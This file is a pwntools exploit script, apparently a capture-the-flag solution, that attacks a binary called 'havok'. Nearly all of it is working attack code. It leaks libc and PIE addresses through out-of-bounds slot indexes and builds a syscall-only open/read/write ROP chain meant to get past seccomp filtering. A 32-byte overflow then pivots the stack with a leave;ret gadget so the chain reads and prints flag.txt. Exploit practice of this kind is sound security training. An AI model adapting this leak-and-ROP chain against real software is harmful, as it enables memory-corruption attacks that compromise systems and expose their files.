from pwn import *

context.arch = 'amd64'
elf = ELF('./havok')
libc = ELF('./libc.so.6')

p = process('./havok') # Ubah ke remote kalau lokal sudah tembus

def calibrate(idx, label):
    p.sendlineafter(b"slot (valid: 0 \xe2\x80\x93 3):", str(idx).encode())
    p.recvuntil(b"energy: ")
    leak = int(p.recvline().strip(), 16)
    p.sendlineafter(b"reading:", label)
    return leak

# --- STEP 1: Leak PIE & Libc ---
log.info("Phase 1: Bypassing Ring Barriers (Leaks)...")
libc_leak = calibrate(65534, b"A")
libc.address = libc_leak - libc.symbols['puts']
pie_leak = calibrate(65535, b"B")
elf.address = pie_leak - elf.symbols['main']
log.success(f"Libc: {hex(libc.address)} | PIE: {hex(elf.address)}")

# --- STEP 2: Precise Gadgets ---
syscall = libc.address + 0x25661 
pop_rax = libc.address + 0xd47d7
pop_rdi = libc.address + next(libc.search(asm('pop rdi; ret')))
pop_rsi = libc.address + next(libc.search(asm('pop rsi; ret')))
pop_rdx = libc.address + 0xd6ffd 
ret = libc.address + next(libc.search(asm('ret')))

plasma_sig = elf.address + 0x4060
flag_store = elf.address + 0x4280 
flag_path_ptr = plasma_sig + 200 

# --- STEP 3: Pure Syscall ROP (ORW) ---
# Kita tidak pakai fungsi Libc sama sekali untuk bypass SECCOMP & Filter
chain = [
    ret,                # Alignment
    # 1. sys_open("flag.txt", O_RDONLY)
    pop_rax, 2,         
    pop_rdi, flag_path_ptr,
    pop_rsi, 0,
    syscall,

    # 2. sys_read(fd=3, buf=flag_store, len=0x100)
    pop_rax, 0,         
    pop_rdi, 3,         
    pop_rsi, flag_store,
    pop_rdx, 0x100,
    syscall,

    # 3. sys_write(fd=1, buf=flag_store, len=0x100)
    pop_rax, 1,         
    pop_rdi, 1,         
    pop_rsi, flag_store,
    pop_rdx, 0x100,
    syscall,
    
    # 4. sys_read(fd=4, ...) -- Backup jika FD bergeser
    pop_rax, 0, pop_rdi, 4, pop_rsi, flag_store, pop_rdx, 0x100, syscall,
    pop_rax, 1, pop_rdi, 1, pop_rsi, flag_store, pop_rdx, 0x100, syscall,

    pop_rax, 60,        # sys_exit
    syscall
]

# Layout: [p64(0) untuk POP RBP] [ROP Chain]
payload_rop = p64(0) + b"".join([p64(x) for x in chain])
payload_rop = payload_rop.ljust(200, b"\x00")
payload_rop += b"flag.txt\x00"
payload_rop = payload_rop.ljust(256, b"\x00")

log.info("Phase 2: Calibrating Plasma Signature...")
p.sendafter(b"bytes):", payload_rop)

# --- STEP 4: The Final Stack Pivot ---
leave_ret = elf.address + 0x1657 

# Buffer confirm = 32 byte. 
# Padding 32 + New RBP + RIP
payload_pivot = b"C" * 32
payload_pivot += p64(plasma_sig)
payload_pivot += p64(leave_ret)

log.info("Phase 3: Initiating Injection (Stack Pivot)...")
p.sendlineafter(b"key:", payload_pivot)

p.interactive()
